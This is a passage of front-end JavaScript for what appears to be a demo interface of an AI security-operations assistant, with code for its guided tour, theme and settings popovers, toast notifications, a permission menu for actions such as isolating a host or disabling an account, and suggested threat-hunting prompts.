  tourPrev(){ const cur=_tour.steps[_tour.i]; if(cur&&cur.exit){ try{cur.exit();}catch(e){} } if(_tour.i>0) _tour.i--; tourRender(); },
  tourEnd(){ const cur=_tour.steps[_tour.i]; if(cur&&cur.exit){ try{cur.exit();}catch(e){} } _tour.active=false; tourUntrack(); const m=document.getElementById('tourMask'); if(m) m.remove(); window.removeEventListener('resize',tourReposition); document.removeEventListener('scroll',tourReposition,{capture:true}); try{ localStorage.setItem('tl_tour_v1','done'); }catch(e){} },
  autPop(e){ e.stopPropagation(); toggleAutPop(e.currentTarget); },
  autPopClose(){ closeAutPop(); },
  setAutonomy(mode,lvl){ commitAutonomy(mode,lvl); },
  setTheme(dark){
    window.__tlThemeOverride = !!dark;   // user choice wins over the design-component prop
    document.body.classList.toggle('theme-dark', !!dark);
    if(dark) document.documentElement.setAttribute('data-theme','dark');
    else document.documentElement.removeAttribute('data-theme');
    const p=$('#settingsPop'); if(p && p.classList.contains('open')) p.innerHTML=railSettingsHTML();
  },
  openSettings(e){ e.stopPropagation(); const p=$('#settingsPop'); const willOpen=!p.classList.contains('open'); $('#permPop').classList.remove('open'); if(willOpen){ p.innerHTML=railSettingsHTML(); positionRailPop(p,e.currentTarget); p.classList.add('open'); armRailPopClose(); } else { p.classList.remove('open'); } },
  closeRailPops(){ const a=$('#permPop'),b=$('#settingsPop'); if(a)a.classList.remove('open'); if(b)b.classList.remove('open'); },
  togglePerm(e){ e.stopPropagation(); const p=$('#permPop'); const willOpen=!p.classList.contains('open'); $('#settingsPop').classList.remove('open'); if(willOpen){ positionRailPop(p,e.currentTarget); p.classList.add('open'); armRailPopClose(); } else { p.classList.remove('open'); } },
  toast(type,title,sub){ toast(type,title,sub); },
  restart(){ const m=state.mode; state=freshState(); markPins(); state.mode=m; document.body.classList.toggle('mode-night',m==='nightshift'); document.body.classList.toggle('mode-day',m==='dayshift'); if(m==='nightshift'){stageNight();state.activeId='night-1';state.inspectorOpen=true;} else {state.activeId='day-1';state.threads['day-1'].suggestions=startChips();} renderPermPop(); renderAll(); toast('info','Demo reset','Back to the start.'); },
};
window.App=App;window.autoGrow=autoGrow;

function startChips(){
  return [
    {label:"Spike in failed logins on the finance subnet (24h)",icon:'db',fn:()=>nextDay()},
    {label:"Show critical alerts from the last hour",icon:'alert',fn:()=>nextDay()},
    {label:"Hunt for suspicious PowerShell",icon:'terminal',fn:()=>huntPowerShell()},
  ];
}

/* ---- toast ---- */
function toast(type,title,sub,act){
  const wrap=$('#toasts');
  const icn={ok:'check',info:'sparkle',warn:'warn'}[type]||'check';
  const node=el(`<div class="toast ${type}"><span class="tic">${ic(icn,14)}</span><span><b>${title}</b>${sub?` <span class="tsub">— ${sub}</span>`:''}</span>${act?`<button class="toast-act">${act.label}</button>`:''}</div>`);
  if(act){ const b=node.querySelector('.toast-act'); if(b) b.onclick=()=>{ node.remove(); act.go(); }; }
  wrap.appendChild(node);
  setTimeout(()=>{ node.style.transition='opacity .3s,transform .3s'; node.style.opacity='0'; node.style.transform='translateY(10px)'; setTimeout(()=>node.remove(),300); }, act?5600:3400);
}

/* ---- permission popover content (mode-aware) ---- */
function renderPermPop(){
  const day=state.mode==='dayshift';
  $('#permA').innerHTML=`<span class="pi">${ic('lock',14)}</span> <span>${day?'Network-isolate a host':'Roll back a deploy'}</span>`;
  $('#permB').innerHTML=`<span class="pi">${ic(day?'userx':'rotate',14)}</span> <span>${day?'Disable an account':'Restart a service'}</span>`;
  $('#permC').innerHTML=`<span class="pi">${ic(day?'siren':'bolt',14)}</span> <span>${day?'Declare an incident':'Page the on-call'}</span>`;
}

/* ---- composer autosize + enter ---- */
function autoGrow(t){ t.style.height='auto'; t.style.height=Math.min(t.scrollHeight,120)+'px'; }
$('#composerInput').addEventListener('input',e=>autoGrow(e.target));
$('#composerInput').addEventListener('keydown',e=>{ if(e.key==='Enter'&&!e.shiftKey){ e.preventDefault(); App.sendComposer(); } });
document.addEventListener('keydown',e=>{ if(e.key==='Escape') App.closeFlyout(); });

/* ============================================================ BOOT */
function markPins(){ ['day-r3','day-amb2','night-r1','night-r2'].forEach(id=>{ if(state.threads[id]) state.threads[id].pinned=true; }); }
function renderAll(){ renderRail(); applySecondary(); renderStage(); renderNav(); renderSpine(); renderStream(); renderSuggest(); renderInspector(); renderHomeMain(); }
function boot(){
  // set static icons
  $('#shieldIc').innerHTML=ic('shield',15);
  $('#sendIc').innerHTML=ic('send',16); $('#footIc').innerHTML=ic('check',11);
  $('#pr1').innerHTML=ic('check',13);$('#pr2').innerHTML=ic('refresh',13);$('#pr6').innerHTML=ic('x',13);
  state=freshState();
  markPins();
  state.threads['day-1'].suggestions=startChips();
  renderPermPop();
  renderAll();
  /* Auto-start tour disabled for demo stability — the run-of-show opens on an untouched brief.
     The tour stays available via the Tour button in the left rail. */
}
boot();

}
